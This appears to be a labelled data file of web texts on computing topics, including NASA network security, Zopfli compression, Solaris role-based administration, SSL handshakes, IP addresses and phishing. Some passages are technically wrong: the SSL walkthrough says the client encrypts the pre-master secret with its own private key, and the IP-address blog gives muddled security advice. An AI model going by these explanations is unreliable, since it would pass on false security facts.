size.\nAlthough the space organization is popularly linked with the space shuttle program, NASA's scope is actually much larger: online, it manages roughly 3,400 websites and maintains approximately 176,000 unique email addresses.\nProtecting these assets is a huge challenge, and many observers are starting to wonder if the $58 million NASA spends annually on network security is going to be enough, moving forward.\n\"Some NASA systems house sensitive information which, if lost or stolen, could result in significant financial loss, adversely affect national security, or significantly impair our nation's competitive technological advantage,\" said Paul Martin, NASA's inspector general. (Source: reuters.com)\nFree eBook: The Windows 7 Guide: From Newbies to Pros. In this 46 page guide you will be introduced to Windows 7 and what it has to offer. It will teach you about the new taskbar, how to resolve software compatibility issues, how to customize Windows Aero, and explain what the Windows 7 Libraries are all about. Also included: a detailed list of what software is included in Windows 7, and how easy networking is with Windows 7 along with other topics. The advice within this guide will help new users become acquainted with Windows 7 and can also help those who are on the fence about purchasing Windows 7 decide if it would be a good idea. Click here to download this eBook now! Note: this eBook is free, but registration is required; after that, you can select more ebooks and videos for download without registering again. If you have questions / problems with the registration form, please read this.", "label": 1}
{"text": "SOFTWARE DEVELOPER Google has open sourced its Zopfli data compression algorithm.\nGoogle encourages its engineers to work on personal projects as part of their \"20 percent time\" and occasionally some of those are made public and open sourced for third party developers. That's why the firm has open sourced its Zopfli data compression algorithm, claiming it produces three to eight percent smaller files compared to zlib.\nGoogle's Zopfli algorithm is based on the Deflate algorithm but has been optimised to produce smaller file sizes at the expense of compression speed. The firm said the compression library, written in C, is based on iterative entropy modelling and a shortest path algorithm, adding that it is bit-stream compatible, meaning that it can be used with gzip, Zip and most importantly HTTP requests.\nLode Vandevenne, a software engineer on Google's Compression Team who implemented the Zopfli algorithm said, \"Due to the amount of CPU time required - two to three orders of magnitude more than zlib at maximum quality - Zopfli is best suited for applications where data is compressed once and sent over a network many times.\"\nUltimately Vandevenne's algorithm might be costly when it comes to CPU cycles for compression - he claims there is no performance hit in decompression - but the fact is that CPU cycles are significantly cheaper than network bandwidth. Developers such as Opera have worked hard on web compression to speed up webpage rendering in markets where 3G connectivity is patchy or non-existent.\nSource code for the Zopfli data compression library is available here. µ\nCompanies need to rate limit posts based on keywords, warns Trend Micro\nUses 20 percent less power than traditional systems\nSign up for INQbot – a weekly roundup of the best from the INQ", "label": 1}
{"text": "|Skip Navigation Links|\n|Exit Print View|\n|Trusted Extensions User's Guide Oracle Solaris 11 Information Library|\nIn contrast to traditional UNIX systems, superuser (the root user) is not used to administer Trusted Extensions. Rather, administrative roles with discrete capabilities administer the system. In this way, no single user can compromise a system's security. A role is a special user account that provides access to certain applications with the rights that are necessary for performing the specific tasks. Rights include labels, authorizations, privileges, and effective UIDs/GIDs.\nThe following security practices are enforced on a system that is configured with Trusted Extensions:\nYou are granted access to applications and authorizations on a need-to-use basis.\nYou can perform functions that override security policy only if you are granted special authorizations or special privileges by administrators.\nSystem administration duties are divided among multiple roles.\nIn Trusted Extensions, you can access only those programs that you need to do your job. As in the Oracle Solaris OS, an administrator provides access by assigning one or more rights profiles to your account. A rights profile is a special collection of programs and security attributes. These security attributes enable successful use of the program that is in the rights profile.\nThe Oracle Solaris OS provides security attributes such as privileges and authorizations. Trusted Extensions provides labels. Any of these attributes, if missing, can prevent use of the program or parts of the program. For example, a rights profile might include an authorization that enables you to read a database. A rights profile with different security attributes might be required for you to modify the database or read information that is classified as Confidential.\nThe use of rights profiles that contain programs with associated security attributes helps prevent users from misusing programs and from damaging data on the system. If you need to perform tasks that override the security policy, the administrator can assign to you a rights profile that contains the necessary security attributes. If you are prevented from running a certain task, check with your administrator. You might be missing required security attributes.\nIn addition, the administrator might assign you a profile shell as your login shell. A profile shell is a special version of a common shell that provides access to a particular set of applications and capabilities. Profile shells are a feature of the Oracle Solaris OS. For details, see the pfexec(1) man page.\nNote - If you try to run a program and receive a Not Found error message or if you try to run a command and receive a Not in Profile error message, you might not be permitted to use this program. Check with your security administrator.\nTrusted Extensions recommends the use of roles for administration. Make sure that you know who is performing which set of duties at your site. The following are common roles:\nroot role – Is used primarily to prevent direct login by superuser.\nSecurity Administrator role – Performs security-relevant tasks, such as authorizing device allocation, assigning rights profiles, and evaluating software programs.\nSystem Administrator role – Performs standard system management tasks, such as creating users, setting up home directories, and installing software programs.\nOperator role – Performs system backups, manages printers, and mounts removable media.", "label": 1}
{"text": "Cloud computing is either a revolutionary IT management tool or a nebulous puff of marketing hype, depending on whom you ask. For now, we’re thinking it’s puffery—but intriguing developments are under way.\nA Cloudy Concept\nRather than house your own IT servers or rent the maximum processing and storage capacity you’ll ever need, why not pay only for what you use, when you use it? That’s the basic idea behind cloud computing—and it’s an alluring possibility for many reasons, not least the desire to contain costs and reduce energy consumption. But it turns out that much of the appeal is based on a murky understanding of the concept.\nAccording to research by Gartner group vice president Mark McDonald, the percentage of CIOs interested in cloud computing has grown considerably, from 5% in 2009 to 37% earlier this year. And the bigger the company, the more likely management is to say that cloud computing is a top-five IT priority.\nInterest in Cloud Computing\nBut three out of four respondents who profess interest in cloud computing report little to none in three of the key technologies it entails: server virtualization, service-oriented architecture, and software as a service. Further, nearly half the respondents equate cloud computing with virtualization alone, which shows that many executives have an incomplete view of it.\nCloud computing has rapidly risen to what McDonald calls “the peak of inflated expectations.” And where is it headed next? The “trough of disillusionment,” he says. That’s because few people can even seem to agree on what cloud computing is, never mind how on earth it should work.\nThe National Institute of Standards and Technology (NIST) IT laboratory’s definition, version 15, is more than 760 words long and includes five characteristics, three service models, four deployment models, and a disclaimer saying, in essence, that the definition will change again soon.\nIs the Cloud Greener?\nDespite all the confusion about cloud computing, the IT laboratory at NIST lays out some figures that make a compelling environmental case for it.\nAccording to one NIST presentation, the number of servers in traditional data centers in the U.S. doubled from 2001 to 2006. Power consumption per server quadrupled in the same time period, even though servers typically operate at only 15% of capacity.", "label": 1}
{"text": "Secure Sockets Layer (SSL) In Depth\nThis week we’ve brought back Dave Hutchieson – with his Scottish accent and technical expertise. To share with us details of how SSL works. This is fairly detailed subject – you’ll need the show notes graphics and links to help understand all the details.\nThanks do Dave for his time in researching this subject and sharing his expertise with the rest of us.\nWarning! – This is going to get pretty detailed. You might want to listen multiple times.\nSymmetric Keys, Public Keys, Private Keys, Certificates and Hashing\nSecure Sockets Layer or SSL\nPart 1 Historical Background\nIn order to get the most from this audiocast, a basic knowledge of symmetric key encryption, public and private key mechanisms, digital certificates and hashing functions is assumed. If this is new material to anyone, or you feel you need a review, please refer to the tutorial weblink included in the show notes.\nA ladder diagram showing the step by step processes involved in SSL is also provided in the show notes. It is suggested that this diagram be referred to whilst the audiocast is in progress.\nWireless Security is one of the most complex topics imagineable. One of the biggest problems is the number of acronyms and abbreviations that are in use. There are a number of security mechanisms in use such as EAP-TLS, EAP-TTLS,EAP- PEAP, EAP-FAST etc etc. It would be nice if there was a common root that could be studied in order to get a foundation for how some of them work. One common type is EAP-TLS. EAP-TLS has it’s roots in TLS or Transport Layer Security. Transport Layer Security in turn, has it’s roots in SSL or Secure Sockets Layer.\nI have found that if you have a good understanding of how SSL works, that can provide a stepping stone to understanding many of the more complex wireless security methods such as PEAP.\nIn this audiocast, we shall look at the SSL protocol in detail. SSL is not only used as a basis for several wireless security protocols but is also used in HTTPS [ Hypertext Transfer Protocol Secure ] which is often used for managing access points in a secure manner.\nThere are support materials provided in the show notes section, and these have diagrams which may be viewed to accompany the audio portion.\nSSL is a very complex protocol and due to time constraints, we will not be able to discuss all the details that are involved. However, it is hoped that by the end of the audiocast, and with the support of the show notes, that you should have a good foundation for further study.\nIn a future audiocast, we shall look at how TLS was developed from SSL and how EAP-TLS was developed from TLS.\nImagine that you are on holiday and are looking out at the countryside. You decide that there are a number of different places that you want to visit on the landscape. You use a paper map to navigate around the landscape.\nIn the early 80’s, an English scientist, Tim Berners-Lee developed the foundation of the world wide web. However, it was a young student called Marc Andreessen from the University of Illinois who developed the first commercial browser. This browser allowed us to navigate from place to place on the electronic landscape. Thus, his browser allowed you to navigate the electronic network landscape or netscape.\nThus, the term Netscape Navigator came into being.\nIt wasn’t long before the commercial aspects of the Internet began to be developed. Companies sprouted up all over the place trying to sell goods and services to people. There was a major problem, however, and that was the issue of security. If someone wanted to buy something, that would probably mean that they would have to provide their credit card number over an open line. A method of hiding that number from prying eyes had to be developed. The issue of confidentiality or privacy had to be covered. There was also the problem of having confidence that the company that you are going to buy something from was actually that company and not an imposter. The issue of authentication had to be covered.\nIt was from this background that the Secure Sockets Layer or SSL was developed.\nPart 2 SSL Overview\nSSL was designed to work on top of a secure transport layer protocol, such as TCP or Transmission Control Protocol. We can get a clue about this from the use of the term “sockets” in the phrase SSL.\nThe designers wanted SSL to accomplish three main goals:\n1. To provide privacy of information\n2. To provide authentication [ although as we shall see later, this is not always mutual authentication ].\n3. To provide a method of message integrity which would allow us to detect if a message had been tampered with on-route from the sender to the destination.\nThe SSL protocol has two layers which sit on top of a reliable transport protocol. In our discussion, we shall assume that protocol is TCP.\nThe uppermost layer comprises three sub-protocols:\n1. The SSL Handshake Protocol\n2. The SSL Change Cipher Spec Protocol\n3. The SSL Alert Protocol.\nThe lowermost layer comprises the SSL Record Protocol\nThe SSL Record Protocol performs a number of functions. Firstly, it takes the application data and divides it into a number of fragments when necessary. The fragment size should be no more than 16,384 bytes in length.\nThe specification says that we can compress these fragments. This is rarely if ever carried out in practice due to compression usually having occurred further up the protocol stack.\nA Message Authentication Code is then added to each fragment.\nEach fragment is now encrypted and an SSL header is added.\nThe secure, integrity enabled fragments are now passed onto the transport layer.\nWe will see later how we obtain the keys used for the actual encryption process.\nPart 3 SSL In Detail\nWe shall now look at the three uppermost protocols, the Change Cipher Spec Protocol, the Alert Protocol and the Handshake Protocol.\nThe Change Cipher Spec Protocol\nThe Change Cipher Spec Protocol allows us to change from one encryption state to another in an organized manner. We shall see more of this later.\nThe Alert Protocol\nThe Alert Protocol allows warning messages to be passed between the two parties. For example, if an incorrect Message Authentication Code is received, an alert protocol message would be sent from one party to the other.\nThe Handshake Protocol\nThe handshake protocol is the meat of the entire system, and is the most crucial component for TLS and EAP-TLS.\nImagine that you are a police officer and your lieutenant tells you that you have to go over to the United Nations to talk to a UN security officer about a very important matter. The officer will be waiting for you at the entrance. Upon arrival, you walk up to him and say “Hello”. He looks at you with puzzled eyes. You realize that your boss has not told you what language he speaks. You say “Guten Tag”. No reponse. You say “Bonjour” no response. You finally say “Buenos Dias”. His eyes light up and he says “Ah, Buenos Dias, como esta usted ?” You shake hands. You show each other your ID badges and start talking.\nIn social situations, we don’t usually just walk up to someone and start talking. We usually say hello and shake hands. Sometimes we need to establish a common language.\nSo it is with SSL. Instead of just starting to communicate, hellos need to be said and handshakes need to take place.\nThere are four main phases to SSL:\n3. Key Exchange\n4. Ongoing communications\nLet’s look at each phase now.\nDuring the negotiation phase, the client and server introduce each other, and decide which encryption, authentication and compression protocols will be used. It should be noted that even though the capability for compression exists in the SSL specification, it is rarely, if ever used.\nIn the authentication phase, the server proves itself to the client via a digital certificate. The server may also ask the client to prove itself via a digital certificate. It should be noted that in the case of Internet shopping, this is rarely, if ever done.\nIn the key exchange phase, a key is exchanged which will be used in creating a master key for encrypted communications. There are several methods by which this can be done, including the Diffie-Hellman method, which I shall discuss in a future audiocast. For now, we shall only discuss what is called the RSA method.\nFirstly, the client randomly generates a key called the pre-master secret key [ or PMSK ] by means of a method that will be covered when we discuss SSL in detail a little later on.\nFirstly, the client encrypts the PMSK with it’s own private key. This allows the server [ who has a copy of the client’s public key ] to authenticate that the PMSK did indeed come from the client.\nThe whole assembly [ that is the PMSK encrypted with the client’s private key ] is now encrypted with the server’s public key [ which came via the server’s certificate ] and sent to the server. The server decrypts the package with it’s own private key. This now leaves the original PMSK which has been encrypted with the client’s private key.\nThe server decrypts this package with the client’s public key and hence authenticates the original PMSK.\nThis original key is not the final key in the process, but is used along with some other items to create the final symmetric key, also known as the master key. From the master key, session keys can be derived.\nNow that both sides have the symmetric or master key, they can exchange messages in an encrypted manner. Digital signatures can also be provided to help ensure authentication and message integrity.\nNow we are now ready to discuss the detailed step by step operation of the SSL handshake protocol.\nStep 1. Client Hello\nThis message begins the entire process.\nThe Client_Hello message is sent from the Client to the Server. There are four main things that are included in the message:\n1. A random number called ClientHello.Random. This random number will be used to create a key later on in the process. The random number consists of a 32 bit timestamp along with 28 bytes created by a random number generator.\n2. A list of cyphersuites and compression methods that the client supports.\n3. The highest version of SSL that the client supports\n4. A session identifier that indicates whether the client wishes to establish a new connection on the current session or establish a new connection on a new session\nThe session identifier is useful for “going back” to previous webpages for example.\nSo what is a cyphersuite ? A cyphersuite consists of a listing of encryption methods, certificates and integrity checking methods. The client cannot just simply say “I am going to use this value of encryption, this certificate and this integrity checking method”. It has to check with the server to see if the server is actually capable of using any of the methods.\nStep 2. Server Hello\nThe Server Hello message is sent from the server to the client. There are four main things that the message contains:\n1. A random number called ServerHello.Random. This number will also be used to create a key later on in the process.\n2. The cyphersuite that the server wishes to use, chosen from the list supplied by the client\n3. The lowest common value of the version given by the client and the highest that the server supports. For example, if the client suggested 2.0 and the server supports up to 3.0, the 2.0 version would be used.\n4. A session ID number. This number uniquely identifies the current session and helps with security.\nThe Cipher Suite is made up two main parts:\nA. The Key Exchange Method. That is, how the keys will be exchanged. For example, this could be the RSA method, Diffie-Hellman method, etc.\nB. The CipherSpec itself, which has fields which tell us the algorithm being used [ for example RC4, DES etc ],\nthe MAC Algorithm [ for example MD 5 or SHA-1 ]\nthe Cipher Type [ for example stream cipher or block cipher ]\nthe HashSize [ for example up to 16 bytes for MD5 and up to 20 bytes for SHA-1 ]\nUp to this point, unique random numbers have been exchanged, an encryption method has been agreed to, and a unique session identifying number called the “session ID” has been generated.\nStep 3. Server Cerificate\nAt this point, the server sends the client it’s digital certificate. This point is very important, as not only will the client use a key provided in the certificate to encrypt messages back to the server, but the certificate provides proof that the server is what it says it is, and not an impostor.\nThe client will have previously been provided with a public key from the certification authority. This authority could be a reputable organization such as Verisign for example.\nAt this stage, we have to carefully distinguish between the two public keys mentioned:\nThe first public key has been provided by the certificate authority, that is, an independent certifier, who basically says: “If you can validate the certificate that you have just received from your server using the public key that I provided to you, you can be certain that the server is who he says he is”\nOnce the certificate has been verified, the client extracts the server’s public key from the certificate. This key is very important. Any messages encrypted with this key can only be decrypted by the server using it’s own private key.\nStep 4 Server Key Exchange\nA server-key-exchange message may be sent in this step. Only some systems require this. In our example of using regular RSA, we do not require this step.\nStep 5 Client Certificate Request\nIn this step, the server may request a certificate from the client via a certificate_request_message. This message has two areas of interest. Firstly a certificate type parameter. The certificate type would cover RSA or Diffie-Hellman for example.\nThe second item concerns certificate authorities. This would give a list of the distinguished names of certificate authorities whom the server deems to be “reliable”.\nStep 6 Server Hello Done\nAt this point, the Server Hello Done Message is sent from the server to the client. This is the end of the first phase of the proctocol exchange.\nHello messages have been sent from the client and server.\nAn encryption method and other security parameters have been agreed to.\nThe client has it’s own random number and that of the server.\nThe server has it’s own random number and that of the client.\nA certificate has been sent from the server to the client, and possibly one from the client to the server.\nThe public key of the server has been extracted from the server’s certificate, ready for use in the second phase.\nA point to note: there are no formal first and second phases in the TLS specification. I have simply broken up the process into two parts in order to, hopefully, make the process easier to undertstand. In a future audiocast, I’ll be covering another EAP method which does have two officially defined phases.\nStep 7 Client Certificate\nIn this step, if the server has requested a certificate, then the client will send one.\nIn the classic case of SSL being used in HTTPS for internet transactions with say an on-line clothing company, the customer or client would not normally have to provide any formal identification with the exception of say a credit card number. This is obviously somewhat a problem , as it means that fraud could and in fact does occur.\nStep 8 Client Key Exchange\nIn common with many other security protocols, a true master secret key is not sent between the two parties. Instead, a key called the pre-master secret is created and sent from the client to the server. This pre-master secret will then be used at both ends of the link to create a master secret key.\nA random number is generated at the client and this number is referred to as the pre-master secret key or PMSK\nFirstly, the client encrypts the PMSK with it’s own private key. This private key is known only to the client.\nThis allows the server [ who has a copy of the client’s public key ] to authenticate that the PMSK did indeed come from the client.\nThe whole assembly [ that is the PMSK encrypted with the client’s private key ] is now encrypted with the server’s public key [ which came via the server’s certificate ] and sent to the server via a client_key_exchange message.\nThe server decrypts the package with it’s own private key.\nThe server’s private key should be known only to the server. This now leaves the original PMSK which has been encrypted with the client’s private key.\nThe server decrypts this package with the client’s public key and hence authenticates the original PMSK.\nAt this stage, both sides have the pre-master secret key. In the next part, the actual or master secret key will be calculated at both ends of the link.\nThe master secret is calculated using a complex hash function involving the pre-master secret, the ClientHello.Random and the ServerHello.Random variables or nonces that were described earlier. The master key is 48 bytes in length. From the master key, a number of other keys are derived. These keys are used for encrypting data sent by the server, for MAC operations performed by the server, for encrypting data sent by the client and for MAC operations performed by the client. Initialization Vector values are produced for the situation in which block ciphers in CBC mode are used.\nStep 9 Client Certificate Verification\nA certificate_verify message is sent if the client previously provided a certificate to the server. This message is only used with certificates that have signing capabilities.\nStep 10 Change Cipher Spec\nIt should be noted that the Change Cipher Spec protocol is a separate protocol from the handshake protocol. It has been included here due to it’s critical function within the handshake protocol itself.\nSSL keeps a record of two states called the current state and the pending state. We can think of these two states as “Conditions that are happening now” and “Conditions that will happen later”.\nWhen SSL is first initialized, both states are zero. Once the master key is established, that key is used for a pending state. Both sides end up with a pending encryption process waiting in the wings so to speak.\nThe pending Cipherspec is copied into the current Cipherspec. We just need some form of agreement between both ends as to when to begin implementing the encryption. This occurs in the next step.\nStep 11 Finished\nThe finished message is used to tell the other end that the key exchange and authentication procedures were successful. This message is encrypted with one of the newly produced keys, and authenticated as well.\nOnce the server receives the encrypted finished message from the client, it is able to send it’s own change_cipher_spec and finished messages in steps 12 and 13 of the process.\nFinally we are able to encrypt any data that needs to be sent from either party.\nThat was quite a lot of material, but the core of the whole process [ as for many other security protocols ] consists of :\nNegotiation, Authentication, Key Exchange and Ongoing Communications\nIn the show notes section, I have included an interesting trace of a client to server communication process\nI hope that this audiocast was useful, and thank you for listening.\nWe’d love to have you subscribe to our RSS feed – just click the button in the upper right corner of the web page. Until next week, thanks for listening!\nIf you have any feedback on the show – please drop an e-mail to feedback@WirelessLANProfessionals.com.", "label": 1}
{"text": "- Category: Technology Featured\n- Published on Wednesday, 15 August 2012 02:08\n- Written by Raja\nComputers especially connected with the internet, the users came to know about a popular word ‘IP’. Outside the computer world IP refers to Intellectual Property; but in our world IP refers to Internet Protocol.\nYou may come across it most of the time on TCP / IP. The TCP refers to Transmission Control Protocol. TCP / IP is generally refers to two computers exchanging data between them.\nOn the internet, every computer (email servers, IP hosts) gets an IP address. Let us take an example. Some organizations send letters. If undelivered they can be returned to them in the address mentioned by them. In the Internet world IP address is doing the same thing apart from other things.\nIP address consists of four arrays of numbers. For example 184.108.40.206 is an IP address, if you’re sending a data this address is just like a postal stamp attached to your letter. It will reach its destination.\nFrom this you can find, from which country, which internet service provider and from which computer this data or email is sent. Some routers and software packages are changing their IP address while sending which should be avoided. If not, using them anybody can access your computer without your permission. It means they can steal the important information, data, your bank account number, credit and debit card numbers, and your passwords easily. These Software or packages are called as Malwares and the IP hacker use Proxies to get your data. They can also use your computer’s IP as a Proxy if you got hacked. There are several Anti Spyware & Malware Programs available in the market to prevent them. Some hackers can use or take control over your computer’s IP address and send their data through it. It will facilitate your IP being abused by other undesirable elements.\nOn the Internet; the Internet Service Providers will allocate IP address for standard computer servers and for standard organizations (that runs computer servers regularly or on daily basis with their clients, consumers, customers, and employees) will be given standard IP address. Otherwise all the computers we are using in our homes, and though our mobiles, tablets, smartphones, and broadband landlines are connected through the Internet Service Provider and get a random IP address. Each time when you are connected to the internet, you get a new IP address.\nPlease bear in mind that can also be easily hacked by the persons over the internet. You have to keep it safe because, last year the scams based on IP addresses is increased by 450% as reported by Symantec. Some hackers are connecting all the computer IP addresses they hacked into a network and using them for their scamming and sending mails for threatening purposes. So, you have to keep your IP address safe. You can do that simply by using Anti-Virus Programs and updating Firewalls regularly on your computer.\nblog comments powered by Disqus", "label": 1}
{"text": "Snopes.com defines phishing as \"a term which refers to the online imitation of a company's branding in spoofed e-mail messages and web sites, created with the intent of fooling unsuspecting users into divulging personal information such as passwords, credit card numbers, PINs, etc. A typical \"phish\" e-mail will appear to come from a financial institution (such as a bank or credit card company), informing the recipient that some type of problem has affected his account and directing him to follow a provided hyperlink to clear up the problem. The hyperlink leads not to a legitimate site, however, but to a server (usually in another country) on which an imitation web site has been set up. The fooled customer is then prompted to enter confidential personal information (collected by the scammers for perpetrating) identify theft and (usually) redirected to a legitimate web site to obscure the fact that he just gave away data to crooks.\"\nPhishing sites can also include malicious elements that are intended to take advantage of web browser vulnerabilities. Even if you don't enter personal information on the spoofed web site, you could be putting your computer's security in danger simply by clicking on the link in the spoofed message. The best way to protect yourself from phishing scams is to never click on the link in an unexpected or suspicious message you receive.\nThe Internet has made the world a much smaller place. While its benefits are tremendous, connecting us to others and to volumes of instant information on any subject anywhere in the world, its downside includes dark alleys frequented by criminals intent on harming you, your computer, and/or your information.\nIn the physical world, it used to be that you knew which dark alleys or bad neighborhoods to avoid. Today the Internet, with all its benefits, has also brought the dark alleyways to your computer. As such, it takes much more vigilance to protect yourself and your computer from would-be criminals.\nSome of the risks you encounter simply by surfing the Internet include, but are not limited to: Identity Theft, viruses and worms that infect your computer, spamming, and spyware infections.\nContent provided by CU Boulder", "label": 1}
{"text": "The School of Earth and Space Exploration (SESE) at Arizona State University (ASU) has deployed more than a petabyte of clustered NAS storage\nErnest Bowman-Cisneros, manager, LROC Science Operations Center at SESE, said his team needs to store petabytes of data in a single volume so it can handle the constant flow of images from the moon. His implementation is the type of \"big data\" storage EMC executives have been talking about since completing the $2.25 billion Isilon acquisition last December.\nSESE switched to Isilon last year as the LRO began sending data back, and after its previous storage setup choked while the team was digitizing images from the Apollo space program.\nSESE runs two 11-node clusters of Isilon NL-Series storage with just under 700 TB of capacity on each cluster. The primary cluster is used for active data with a secondary cluster serving as a redundant copy stored in a separate site. SESE uses Isilon SyncIQ software to synchronize data between the two clusters.\nBowman-Cisneros said SESE has published nearly 100 TB of data from the lunar camera in the first year of the project, and he expects it to generate approximately 170 TB a year from now on – 120 TB of published data plus about 50 TB of other data from the spacecraft. The LRO is expected to remain in orbit between four and nine years.\n\"We don't need fast I/O performance, but we do need a large storage solution,\" Bowman-Cisneros said. \"One of our biggest storage requirements was that we would be able to grow to multi-petabyte volumes. If we couldn't grow to those large volumes, we would have small pods and we'd have to have a sufficiently high-speed solution to move data from one volume to the next. We couldn't do that with our budget.\"\nBowman-Cisneros said before the LRO project, his group began storing data from the Apollo Scan Project undertaken by NASA's Johnson Space Center (JSC) in 2006 to digitize photographs taken from Apollo missions.\nFor the Apollo Scan Project, SESE originally used NetApp storage running redundant Red Hat Global File System (GFS) nodes set up by ASU's high-performance computing (HPC) group. That project gave Bowman-Cisnero's team time to work out any storage problems before the LRO cameras began sending back data beginning in 2010.\nSix months into the Apollo project, the size of the clusters grew too large for SESE's GFS heads and caused system crashes, Bowman-Cisneros said. One crash lasted a week.\n\"According to Red Hat, we were running one of the largest back-end clusters to GFS, and we hit the limit of that implementation,\" he said. \"The size of the system and the way the system was being accessed freaked out the GFS heads. At one point, we had multiple heads, but after this [one-week] outage we had to revert to a single node so we could continue operations and not encounter this problem again.\"\nHe said the LRO team never lost data but the crashes caused inconvenient delays.\n\"That one node tended to lock up if it got very busy, and we'd have to restart it, which caused minor delays in data processing,\" he said. \"If the load got very high on it, it actually took out the file system, lost state with back-end filers, and the storage solution went away and we'd have to wait for it to re-start. So while the solution was working, it suffered from this performance problem and we also needed more storage for the next iteration of processing.\"\nSo after four years with his original storage system, Bowman-Cisneros decided it was time for an upgrade. He said he talked to approximately six NAS vendors, and only Isilon and IBM said they could fulfill the LRO requirements. Isilon pitched its NL-Series and IBM proposed SONAS based on its General Parallel File System (GPFS).\nIsilon quickly sent out a six-node test system early last December. Bowman-Cisneros said it \"passed with flying colors\" and LRO has had Isilon in full product for approximately a month.\n\"Isilon was very aggressive getting us equipment and making sure it was set up correctly,\" he said. \"We had a full implementation of their hardware set up in short order to test all our requirements and some of the issues we were having with the old solution.\"\nHe said the only problem he's had with Isilon was a software patch that caused some problems with his secondary node but didn't impact day-to-day performance. Tech support quickly solved the problem and he was able to apply the patch to both systems without problems.\nBowman-Cisneros was testing Isilon's system at the same time EMC was negotiating its acquisition of the clustered NAS vendor.\n\"It wasn't until after we signed on the dotted line that we found out about EMC,\" Bowman-Cisneros said. \"By the end of December, we had completed our testing and decided to go with their system. At this point, [the acquisition has] been inconsequential to us. My only concern is that EMC will continue to develop and support the model I have.\"\nThis article was originally published onSearchStorage.com.", "label": 1}
{"text": "Internet Standards and Operating Systems - Why Integration Makes Sense\nIn the relatively brief history of personal computers, computer users—both individuals and organizations—have benefited from a staggering rate of growth in new capabilities, and improvements in old capabilities. We've seen PCs evolve from slow, silent, unattractive, standalone machines that couldn't even store a single 10-page document into easy-to-use machines that can play movies, communicate around the world, and manage reams of data at speeds that exceed those of mainframe computers [twenty] years ago. This evolution in capabilities has arisen out of many individual innovations and the standardization of such innovations, which sets the stage for the next round of innovation to occur.\nOn This Page\nA Beneficial Cycle: Innovations Become Standard Capabilities\nInternet Standards – The Next Great Enabling Technology\nInternet Technologies in Windows - Making it Easier for Software Vendors\nPlatform Services - Doesn't integration harm other peoples' businesses?\nA Beneficial Cycle: Innovations Become Standard Capabilities\nOne of the primary roles of an operating system—perhaps its most important—is to provide a common platform of services for 3rd parties to create new applications, hardware devices, etc. Operating systems have always done this, and over time each operating system has made its platform of services broader and more capable. Windows is no exception.\nIn the beginning, Windows had a fairly limited set of services; Windows-based applications couldn't ask Windows to do very much for them—they couldn't ask the operating system to get files from any kind of network, they couldn't ask it to draw very many interesting things on the screen, they couldn't even ask it to play a sound. But, by continually adding new capabilities to Windows, Microsoft has made it easy for application vendors to create more capable applications with features that make them more appealing to consumers.\nOften, new capabilities added to Windows started out as innovations created by other parties—and sometimes they have been developed within Microsoft. With a thriving and competitive software industry, anyone can create a new and useful element using the platform of services that comprises Windows, and including some of these in the operating system makes them available for everyone to share. The beneficial cycle, over time, moves the most generally useful capabilities into the operating system, enhancing the user experience and paving the way for further innovations that will make the whole experience of using PCs better.\nLet's look at a couple of examplesU.\nSix years ago a \"toolbar\" was an uncommon thing in an application window. The first application to ever create a toolbar—the row of buttons that make it easy to perform common operations like \"open\" and \"save\"—was Microsoft Excel. When Microsoft Excel created the first toolbar, the developers wrote all the computer-code for the toolbar on their own. This was a lot of work, but it turned out that users liked toolbars very much, so the effort was worth it for the Excel team. If any other application wanted to include a toolbar as well, they'd have to do all of that same work on their own.\nOver time, lots of people at lots of companies spent a great deal of time writing toolbars. Across the industry, this was an inefficiency. Effort was duplicated from team to team, and even worse, when two different applications with two different toolbars were running on a given PC, two separate sets of computer code were executing simultaneously on the machine to generate those toolbars, making the PC run more slowly.\nEventually, toolbars became so common that it made sense for Windows itself to provide a single facility for generating toolbars that everyone could use. When Windows 95 shipped, that was one of many new services the operating system offered to any application developer. The result—more applications than ever now have toolbars, and all the toolbars work well and in a consistent manner across applications. Because all of those toolbars are generated by the same set of computer code, PCs run faster. And perhaps the greatest benefit is that hundreds of software development teams around the world are now able to spend their time on new innovations instead of implementing the computer-code for yet another toolbar.\nCan you remember when you bought a PC and it had no sound capabilities? Well, that wasn't really very long ago. Basic PCs often didn't come with sound cards, and no standard software existed that application developers could rely on to produce sounds. Any application that wanted to use sounds had to create a team of people to go write all the computer code associated with understanding whether the PC had a sound card, figuring out what kind it was, and playing sounds on it.\nThis was a major task. Different sound cards had different capabilities, and it took a lot of work to get right all the computer code needed to handle each and every possible configuration of a user's PC. Developers of individual applications were even forced to make sure to provide things like volume controls, since nothing like that was standard in the PC environment.\nOver time, sound cards gained popularity, and application vendors were repeatedly required to duplicate the work necessary to incorporate sound into their applications. At that point, it made sense to integrate sound support into the operating system (including both these application services and end-user features like a sound-player and CD-player).\nToday, many Windows-based applications use sound, relying on Windows to handle the housekeeping chores inherent in providing sound for them. It's become quite routine, really. Think about all the games you use, the CD-ROM titles you play, even the web-browsing software you run has sound capabilities built-in. This has happened because application developers now longer have no write lots of computer code themselves in order to incorporate sound into their products. Instead, all they need to do is say \"Windows—can you play this sound for me?\" and the rest is taken care of. Once again, the knowledge that the platform of services that comprises Windows includes such capabilities frees software developers to spend their time improving unique aspects of their products.\nInternet Standards – The Next Great Enabling Technology\nYou're undoubtedly reading this because you're interested in the debate surrounding Microsoft's integration of Internet technologies into Windows. Is this the right thing for Microsoft to do? Does it benefit or harm the PC industry? And what will the effect be on consumers who actually use PCs?\nEmergence of Internet Standards\nFor quite a few years a group of people known as the \"IETF\" (Internet Engineering Task Force) has been developing a set of standard methods for people and computer applications to communicate with each other across the Internet and other similar networks. These folks aren't from any one company, they represent lots of different interests, and their goal has been to specify technologies and protocols that anyone can use.\nNumerous products now take advantage of these Internet standards. Of course, that includes the web-browsing software, but there are lots of others products as well—email packages, things like the Pointcast screensaver and even custom applications that businesses use to communicate or conduct commerce. You might be surprised to learn that even Microsoft Office 97 relies on Internet standards to allow you to save Office documents to a certain type of Internet server.\nIn fact, the set of standards created and managed by the IETF and the Worldwide Web Consortium (W3C) is quite broad and covers more than just network-related stuff. It's worth understanding what some of these standards are about.\nHTML – a universal file format. HTML (\"Hypertext Markup Language\") is an English-like language that people can use to describe the way text, images, videos and sounds should be displayed on a computer screen. When you visit a web page, the screen you're seeing was written in HTML. Once this standard file format was created, it's become possible to create documents or screen displays that can be viewed in any application or on any computer that supports the standard. HTML is a very powerful screen-description language, and it's becoming more widespread even in applications that have no necessary connection to the Internet.\nHTTP/FTP (etc.) – universal ways of moving data or files across a network. HTTP (\"Hypertext Transfer Protocol\"), FTP (\"File Transfer Protocol\") and similar network protocols describe standard ways that anybody can get a file from this computer to that one across a network. These protocols are used on the Internet, but they are also used on corporate intranets and other types of networks.\nURL – a universal address for files 